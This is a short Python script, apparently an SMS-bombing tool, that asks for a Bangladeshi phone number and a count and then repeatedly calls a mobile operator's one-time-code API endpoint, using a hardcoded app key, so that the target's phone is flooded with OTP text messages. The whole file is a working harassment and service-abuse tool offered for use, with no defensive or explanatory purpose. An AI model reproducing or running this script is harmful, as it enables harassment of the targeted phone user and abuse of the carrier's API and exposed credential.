import requests
from requests.structures import CaseInsensitiveDict


number  = str(input("[>] Enter The BD Number: "))
amount = int(input("[>] Enter The Amount: "))

api = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13002&app_version=78&msisdn=88"+number

headers = CaseInsensitiveDict()
headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"


for i in range(amount):
	requests.get(api,headers=headers)
	print(str(i)+"SMS Sent")